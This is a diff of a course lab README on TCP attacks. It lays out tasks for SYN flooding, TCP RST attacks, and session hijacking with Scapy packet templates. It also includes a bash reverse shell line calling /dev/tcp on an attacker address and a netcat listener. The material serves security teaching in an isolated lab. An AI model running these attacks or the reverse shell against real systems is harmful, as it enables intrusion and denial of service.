@@ -17,89 +17,119 @@ This lab involves various TCP attacks, including SYN Flooding, TCP RST attacks, 
 
 ### Q1 Task 1: SYN Flooding Attack
 
-#### Introduction
+**Objective:** Demonstrate a SYN Flooding attack and the effect of SYN cookies.
 
-In this lab, we will explore TCP SYN Flood attacks and their countermeasures. A SYN Flood is a type of Denial of Service (DoS) attack where attackers send numerous SYN requests to a target’s TCP port, but do not complete the 3-way handshake. This fills up the target's queue of half-open connections, preventing legitimate connections from being established.
+1. **SYN Flooding Overview:**
+   - SYN flooding is a Denial of Service (DoS) attack where attackers send many SYN requests to a victim’s TCP port without completing the handshake.
 
-#### Understanding SYN Flood Attack
+   ![SYN Flooding Attack Illustration](images/tcp2.png)
 
-##### How SYN Flood Works
+2. **Queue Size Check:**
+   - Use the command `sysctl -q net.ipv4.tcp_max_syn_backlog - 128` to check and set the queue size.
 
-1. **Attack Mechanism**: Attackers send a flood of SYN packets to the target TCP port.
-2. **Half-Open Connections**: The target machine’s queue for half-open connections (those that have received a SYN and SYN-ACK but not yet the final ACK) gets filled.
-3. **Result**: The target cannot accept new connections when the queue is full, leading to a denial of service.
+3. **SYN Cookie Countermeasure:**
+   - Enable/Disable SYN cookies using:
+     ```bash
+     sudo sysctl -a | grep syncookies
+     sudo sysctl -w net.ipv4.tcp_syncookies=0 # Turn off SYN cookies
+     sudo sysctl -w net.ipv4.tcp_syncookies=1 # Turn on SYN cookies
+     ```
+   - Note: These commands don’t work inside the container; they should be set in `docker-compose.yml` if needed.
 
-![SYN Flood Attack](tcp2.png)
+4. **Launching the Attack:**
+   - Compile and run the attack using:
+     ```bash
+     gcc -o synflood synflood.c
+     synflood 10.9.0.5 23
+     ```
 
-##### Checking Queue Size
+5. **Observations:**
+   - Compare the results using `netstat -nat` before and during the attack.
+   - Test connectivity from another machine using telnet.
 
-On Ubuntu, check the maximum number of SYN requests the system can handle with:
+6. **Screenshots:**
+   - **SYN cookies off, Attack in progress:** [Screenshot](TCP_Attack_without_the_SYN_cookie_mechanism.png)
+   - **SYN cookies on, Attack in progress:** [Screenshot](TCP_Attack_with_the_SYN_cookie_mechanism.png)
 
-```bash
-sysctl -q net.ipv4.tcp_max_syn_backlog
-Observing Connections
-Use netstat to observe the state of connections:
+### Q2 Task 2: TCP RST Attacks on Telnet Connections
 
-bash
-Copy code
-netstat -nat
-SYN-RECV: Represents half-open connections.
-ESTABLISHED: Represents completed connections.
-SYN Cookie Countermeasure
-Enabling/Disabling SYN Cookies
-Ubuntu uses SYN cookies as a default measure against SYN flood attacks. You can check and modify SYN cookies settings with:
+**Objective:** Launch a TCP RST attack to break an established telnet connection.
 
-bash
-Copy code
-# Check SYN cookies status
-sudo sysctl -a | grep syncookies
+1. **Manual Attack:**
+   - Use Scapy to conduct the attack. Replace placeholders with actual values from Wireshark:
+     ```python
+     #!/usr/bin/env python3
+     from scapy.all import *
+     ip = IP(src="@@@@", dst="@@@@")
+     tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+     pkt = ip/tcp
+     ls(pkt)
+     send(pkt, verbose=0)
+     ```
 
-# Disable SYN cookies
-sudo sysctl -w net.ipv4.tcp_syncookies=0
+2. **Screenshots:**
+   - **Python/Scapy Code:** [Screenshot](Q2_Python_Scapy_code.png)
+   - **Wireshark Frames:**
+     - Frame showing SEQ/ACK numbers: [Screenshot](Q2_TCP_RST_ATTACK_Wireshark_1.png)
+     - Frame showing TCP RST attack: [Screenshot](Q2_TCP_RST_ATTACK_Wireshark_2.png)
 
-# Enable SYN cookies
-sudo sysctl -w net.ipv4.tcp_syncookies=1
-Note: These commands only work on the VM, not within the provided container, which is restricted from changing these settings. To modify the SYN cookie setting in a container, add the following to the docker-compose.yml file:
+3. **Optional Bonus:**
+   - Automate the attack using Scapy’s `sniff()` function. Submit a PDF with details of automation.
 
-yaml
-Copy code
-sysctls:
-  - net.ipv4.tcp_syncookies=0
-Launching the Attack
-Compiling and Running the Attack
-Compile the Attack Program:
+### Q3 Task 3: TCP Session Hijacking
 
-bash
-Copy code
-gcc -o synflood synflood.c
-Run the Attack:
+**Objective:** Hijack an existing TCP connection and inject malicious commands.
 
-bash
-Copy code
-# Run the attack from the attacker container
-synflood 10.9.0.5 23
-Observing the Impact
-Before and After Attack: Compare the output of netstat -nat before and during the attack.
-Telnet Test: Attempt to telnet into the target machine from another machine.
-Observations
-Impact on Ubuntu 20.04:
+1. **Manual Attack:**
+   - Use Scapy to perform the session hijacking. Replace placeholders with actual values from Wireshark:
+     ```python
+     #!/usr/bin/env python3
+     from scapy.all import *
+     ip = IP(src="@@@@", dst="@@@@")
+     tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+     data = "@@@@"
+     pkt = ip/tcp/data
+     ls(pkt)
+     send(pkt, verbose=0)
+     ```
 
-New Connections: Machines that have never connected to the victim before may fail to telnet during the attack.
-Existing Connections: Machines that had previously established a connection may still be able to connect during the attack. This behavior does not occur in Ubuntu 16.04 and earlier versions.
-Explanation: Ubuntu 20.04 implements a mitigation where 1/4 of the backlog is reserved for known destinations. To remove this effect, run:
+2. **Screenshots:**
+   - **Python/Scapy Code:** [Screenshot](Q3_Python_Scapy_code.png)
+   - **Wireshark Frames:**
+     - Frame showing SEQ/ACK numbers: [Screenshot](Q3_TCP_Session_Hijacking_Attack_before.png)
+     - Frame showing injected code: [Screenshot](Q3_TCP_Session_Hijacking_Attack_after.png)
 
-bash
-Copy code
-# Check TCP metrics
-ip tcp_metrics show
+3. **Optional Bonus:**
+   - Automate the attack using Scapy’s `sniff()` function. Submit a PDF with details of automation.
 
-# Flush TCP metrics
-ip tcp_metrics flush
-Conclusion
-Enabling SYN Cookies:
+### Q4 Task 4: Creating Reverse Shell using TCP Session Hijacking
 
-Enable SYN cookies and re-run the attack. Compare the results with SYN cookies turned off. Take screenshots to document:
-SYN Cookies Off: Attack in progress, and telnet attempts are failing.
-Screenshot 1: ![TCP Attack with the SYN cookie mechanism](TCP Attack with the SYN cookie mechanism.png)
-SYN Cookies On: Attack in progress, and telnet is successful.
-Screenshot 2: ![TCP Attack without the SYN cookie mechanism](TCP Attack without the SYN cookie mechanism.png)
+**Objective:** Use TCP session hijacking to set up a reverse shell.
+
+1. **Reverse Shell Setup:**
+   - The reverse shell command example:
+     ```bash
+     /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
+     ```
+   - Netcat setup on the attacker machine:
+     ```bash
+     nc -lvp 9090
+     ```
+
+2. **Screenshots:**
+   - **Python/Scapy Code:** [Screenshot](Q4_Python_Scapy_code.png)
+   - **Reverse Shell Connection:** [Screenshot](Q4_reverse_shell.png)
+
+3. **Optional Bonus:**
+   - Automate the attack and setup. Submit a PDF with details of automation.
+
+## Submission Instructions
+
+- Follow the [instructions](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf) in the PDF document for submission.
+- Submit screenshots showing the VM screen with date and time for each attack.
+
+## Due Dates
+
+- **Normal Due Date:** 11 Feb
+- **Earliest Acceptance Date:** 6 Feb (+1% bonus per day, up to +5% bonus for five days early)
+- **Latest Acceptance Date:** 21 Feb (-10% points)
